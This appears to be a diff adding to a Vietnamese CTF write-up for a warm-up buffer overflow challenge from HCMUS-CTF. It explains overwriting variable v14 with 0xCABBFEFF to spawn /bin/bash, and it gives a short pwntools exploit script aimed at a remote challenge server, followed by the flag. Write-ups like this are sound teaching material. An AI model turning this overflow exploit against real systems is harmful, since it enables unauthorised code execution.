@@ -35,3 +35,18 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   return 0;
 }
 ```
+Đây là 1 bài buffer overflow cơ bản, chỉ cần ghi đè giá trị của biến `v14` thành `0xCABBFEFF` là có thể thực thi lệnh `/bin/bash`
+
+# Script
+```python3
+from pwn import *
+
+r = remote('61.28.237.24', 30200)
+
+print(r.recvuntil('Tell me your birthday?'))
+payload = b'A' * 24
+payload += p32(0xCABBFEFF)
+r.sendline(payload)
+r.interactive()
+```
+Flag: HCMUS-CTF{Just_A_Warm_Up_Pwn}
